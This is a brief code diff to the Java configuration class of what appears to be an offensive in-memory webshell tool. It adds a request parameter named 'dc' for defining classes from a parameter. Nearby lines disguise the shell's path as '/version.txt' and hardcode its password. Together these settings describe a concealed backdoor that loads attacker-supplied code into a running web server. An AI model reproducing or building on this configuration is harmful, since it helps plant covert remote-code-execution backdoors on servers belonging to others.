@@ -42,6 +42,9 @@ public class Config {
 	// 各种方式的内存马映射的路径
 	public static String URL_PATTERN = "/version.txt";
 
+	// DefineClassFromParameter 的路径
+	public static String PARAMETER = "dc";
+
 	// 内存马的密码
 	public static String PASSWORD = "0f359740bd1cda99";
 
